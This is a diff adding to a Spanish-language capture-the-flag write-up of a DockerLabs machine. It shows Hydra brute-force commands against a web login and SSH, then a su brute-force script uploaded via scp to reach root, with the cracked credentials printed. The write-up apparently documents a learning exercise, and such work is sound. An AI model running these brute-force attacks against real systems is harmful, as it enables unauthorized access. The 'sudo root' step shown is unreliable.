@@ -61,3 +61,71 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 275]
 ===============================================================
 ```
+
+Se logra encontrar `/login.php` y decido acceder y examinarla:
+  
+<img width="596" height="856" alt="Screenshot_2" src="https://github.com/user-attachments/assets/f03c1dc6-9da3-43aa-8906-1a8aca2611c8" />
+
+Como me encuentro en otro login, decido hacer otro ataque de fuerza bruta con `hydra` otra vez. Pero primero interceptamos la petición de login con `burpsuit`, el objetivo es identificar la cabezera de autorización y ver como se envía las credenciales para poder realizar el ataque de fuerza bruta:
+
+<img width="489" height="347" alt="Screenshot_1" src="https://github.com/user-attachments/assets/51948847-9e5d-40c7-bad2-34eab62e4c7e" />
+
+Y procedo con el ataque de fuerza bruta:
+```bash
+hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P 300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas."
+---
+[80][http-post-form] host: 172.17.0.2   misc: /login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas.   login: admin   password: chocolate
+```
+(Decidí solo utilizar las primereras 300 contraseñas de rockyou para ir mas rápido)
+- El usuario es: **admin**
+- La contraseña es: **chocolate**
+
+Cuando se logra acceder con las credenciales, lo que nos aparece es un mensaje donde nos menciona un usuario, **balutin**:
+  
+<img width="361" height="134" alt="Screenshot_4" src="https://github.com/user-attachments/assets/e8d0959a-b9ff-478b-bacc-b1f0611cdf59" />
+  
+De nuevo, decido hacer otro ataque de fuerza bruta con `hydra`, pero esta vez directamente al login del SSH que hemos detectado antes:
+```bash
+# hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
+---
+[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
+```
+- La contraseña es: **estrella**
+
+Procedo a entrar al servidor con el usuario **balutin** y la password **estrella**:  
+```bash
+> ssh balutin@172.17.0.2
+```
+
+### Escala de privilegios
+Decido explorar por servidor con el usuario `balutin` con la idea de poder escalar privilegios, pero no encuentro nada claro. Decido investigar por internet métodos de escala de privilegios y me decanté por el script [suBruteforce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh). Un ataque de fuerza bruta directamente al usuario `root`.  
+
+Primero hay que descargar el script y subirlo al servidor:
+```bash
+> scp suBruteforce.sh balutin@172.17.0.2:/tmp/
+```
+También, importante subir una lista de contraseñas:
+```bash
+> scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
+```
+
+Una vez hemos subido los archivos, accedemos con el usuario `balutin` y ejecutamos el script indicando el usuario y la lista de contraseñas:
+```bash
+> cd /tmp
+> chmod +x suBruteforce.sh
+> ./suBruteforce.sh root rockyou.txt
+```
+<img width="462" height="44" alt="Screenshot_5" src="https://github.com/user-attachments/assets/ee58be94-1e93-41e5-ad0a-d0fae405a5d2" />
+  
+- La contraseña es: **rockyou**
+
+Procedo a acceder con el usuario `root`:
+```bash
+> sudo root
+> whoami
+---
+root
+```
+
+## Comantarios
+Esta es la tercera maquina realizo de **DockerLabs** y en esta he tardado mas en completarla que las anteriores ya que he tenido que investigar mucho sobre ataques de fuerza bruta, en este caso con `hydra`. Estoy empezando en el tema del pentesting y con esta maquina he aprendido mucho de fuerza bruta.
